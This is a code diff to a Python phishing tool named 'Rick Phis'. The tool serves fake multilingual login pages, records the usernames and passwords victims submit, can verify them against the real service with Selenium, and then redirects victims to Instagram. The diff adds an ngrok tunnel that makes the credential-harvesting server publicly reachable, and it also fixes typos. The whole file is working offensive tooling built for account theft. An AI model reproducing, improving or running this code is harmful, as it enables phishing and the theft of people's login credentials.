@@ -12,6 +12,7 @@ import socket
 import time
 from datetime import datetime
 from webdriver_manager.firefox import GeckoDriverManager
+from pyngrok import ngrok
 
 init()
 
@@ -47,37 +48,38 @@ print(Fore.RESET)
 path_separator = '\\' if platform.system() == 'Windows' else '/'
 
 language_mapping = {
-    'ar': f"htmls{path_separator}ar.html",
-    'az': f"htmls{path_separator}az.html",
-    'ch': f"htmls{path_separator}ch.html",
-    'en': f"htmls{path_separator}index.html",
-    'fr': f"htmls{path_separator}fr.html",
-    'de': f"htmls{path_separator}de.html",
-    'it': f"htmls{path_separator}it.html",
-    'ko': f"htmls{path_separator}ko.html",
-    'ru': f"htmls{path_separator}ru.html",
-    'es': f"htmls{path_separator}es.html",
-    'tr': f"htmls{path_separator}tr.html"
+    'ar': f"htmls{'\\' if platform.system() == 'Windows' else '/'}ar.html",
+    'az': f"htmls{'\\' if platform.system() == 'Windows' else '/'}az.html",
+    'ch': f"htmls{'\\' if platform.system() == 'Windows' else '/'}ch.html",
+    'en': f"htmls{'\\' if platform.system() == 'Windows' else '/'}index.html",
+    'fr': f"htmls{'\\' if platform.system() == 'Windows' else '/'}fr.html",
+    'de': f"htmls{'\\' if platform.system() == 'Windows' else '/'}de.html",
+    'it': f"htmls{'\\' if platform.system() == 'Windows' else '/'}it.html",
+    'ko': f"htmls{'\\' if platform.system() == 'Windows' else '/'}ko.html",
+    'ru': f"htmls{'\\' if platform.system() == 'Windows' else '/'}ru.html",
+    'es': f"htmls{'\\' if platform.system() == 'Windows' else '/'}es.html",
+    'tr': f"htmls{'\\' if platform.system() == 'Windows' else '/'}tr.html"
 }
 
 error_pages = {
-    'ar': f"errors_htmls{path_separator}errorar.html",
-    'az': f"errors_htmls{path_separator}erroraz.html",
-    'ch': f"errors_htmls{path_separator}errorch.html",
-    'en': f"errors_htmls{path_separator}errordef.html",
-    'fr': f"errors_htmls{path_separator}errorfr.html",
-    'de': f"errors_htmls{path_separator}errorde.html",
-    'it': f"errors_htmls{path_separator}errorit.html",
-    'ko': f"errors_htmls{path_separator}errorko.html",
-    'ru': f"errors_htmls{path_separator}errorru.html",
-    'es': f"errors_htmls{path_separator}errores.html",
-    'tr': f"errors_htmls{path_separator}errortr.html"
+    'ar': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorar.html",
+    'az': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}erroraz.html",
+    'ch': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorch.html",
+    'en': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errordef.html",
+    'fr': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorfr.html",
+    'de': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorde.html",
+    'it': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorit.html",
+    'ko': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorko.html",
+    'ru': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errorru.html",
+    'es': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errores.html",
+    'tr': f"errors_htmls{'\\' if platform.system() == 'Windows' else '/'}errortr.html"
 }
 
+# Yardım menüsü
 help_menu = f"""{Fore.WHITE}
 RICK PHIS - PROFESSIONAL PHISHING TOOL
 
-        Arguments            Reqired           Description 
+        Arguments            Required           Description 
                                                                                                                                                        
   --site  <site_number>       {Fore.RED}YES{Fore.WHITE}         Site number (e.g., 1, 2, 3)                                                                                   |
   --lang  <language_code>     NO          Language code (ar,az,ch,en,fr,de,it,ko,ru,es,tr) (default: en)                                                
@@ -86,12 +88,13 @@ RICK PHIS - PROFESSIONAL PHISHING TOOL
   --location <url>            NO          Redirect location (default: https://instagram.com)                                                            
   --check                     NO          It tests the entered information and shows whether it is correct. 
                                           Attention, this process may cause delays! 
+  --ngrok-token <token>       YES         Ngrok authentication token for tunneling
   --help                      NO          Show this help message and exit                                                                               
 """
 
 login_check = False
 
-def check_turst(username, password):
+def check_trust(username, password):
     global login_check
     driver = webdriver.Firefox(executable_path=GeckoDriverManager().install())
     driver.implicitly_wait(0)
@@ -119,18 +122,6 @@ def check_turst(username, password):
 
     driver.quit()
 
-def get_ip_address():
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    try:
-        s.connect(('google.com', 80))
-        ip_address = s.getsockname()[0]
-    except Exception as e:
-        print("Failed to obtain IP address:", e)
-        ip_address = None
-    finally:
-        s.close()
-    return ip_address
-
 def find_empty_port(start_port=8000, end_port=65535):
     for port in range(start_port, end_port + 1):
         if not is_port_in_use(port):
@@ -147,12 +138,13 @@ def is_port_in_use(port):
     except OSError:
         return True
 
+
 class CustomArgumentParser(argparse.ArgumentParser):
     def error(self, message):
         raise argparse.ArgumentError(None, message)
 
 def main():
-    global web_site
+    global web_site, ngrok_url
     parser = CustomArgumentParser(description="Rick Phis - professional phishing tool", usage=argparse.SUPPRESS, add_help=False)
     parser.add_argument('--site','-s', type=int, required=True, help='Site number (e.g., 1, 2, 3)')
     parser.add_argument('--lang','-l', type=str, default='en', help='Language code (e.g., en, tr, de)')
@@ -160,6 +152,7 @@ def main():
     parser.add_argument('--output','-o', type=str, help='Gets information as output')
     parser.add_argument('--location', type=str, default='https://instagram.com', help='Redirect location (default: https://instagram.com)')
     parser.add_argument('--check', '-c', action='store_true', help='Perform login check')
+    parser.add_argument('--ngrok-token','-ng', type=str, required=True, help='Ngrok authentication token for tunneling')
 
     try:
         while True:
@@ -195,15 +188,14 @@ def main():
                 continue
 
             if chosen == 1:
-                start_server(web_site, port, output_file, redirect_location,check_trust)
+                start_server(web_site, port, output_file, redirect_location, check_trust, args.ngrok_token)
             else:
                 print(f"Site {chosen} is under development. Coming soon!")
 
     except KeyboardInterrupt:
         print(Fore.YELLOW, "\nRick Phis was stopped (ctrl+c)", Fore.RESET)
 
-
-def start_server(web_site, port, output_file, redirect_location, check_trust):
+def start_server(web_site, port, output_file, redirect_location, check_trust, ngrok_token):
     class MyHTTPRequestHandler(BaseHTTPRequestHandler):
         def do_GET(self):
             file_path = self.path.strip('/')
@@ -256,7 +248,7 @@ def start_server(web_site, port, output_file, redirect_location, check_trust):
                         file.write(log_message)
                 
                 if check_trust:
-                    check_turst(sel_username, sel_password)
+                    check_trust(sel_username, sel_password)
                 
                 if login_check or not check_trust:
                     self.send_response(302)
@@ -271,7 +263,7 @@ def start_server(web_site, port, output_file, redirect_location, check_trust):
                 self.send_error(500, f'Failed to process POST request: {e}')
 
 
-    host = get_ip_address()
+    host = "localhost"
     if port:
         if is_port_in_use(port):
             print(Fore.RED, f"The specified port {port} is already in use.")
@@ -283,7 +275,13 @@ def start_server(web_site, port, output_file, redirect_location, check_trust):
     if c_port:
         try:
             server = HTTPServer((host, c_port), MyHTTPRequestHandler)
-            print(f"{Fore.GREEN}\nServer is started on: http://{host}:{c_port}/\n", Fore.RESET)
+            
+            ngrok.set_auth_token(ngrok_token)
+            ngrok_tunnel = ngrok.connect(c_port)
+            ngrok_url = ngrok_tunnel.public_url
+            print(f"{Fore.GREEN}\nNgrok URL: {ngrok_url}\n", Fore.RESET)
+            print(f"{Fore.GREEN}Local Server URL: http://{host}:{c_port}/\n", Fore.RESET)
+            
             server.serve_forever()
         except Exception as e:
             print(Fore.RED, f"Failed to start server: {e}")
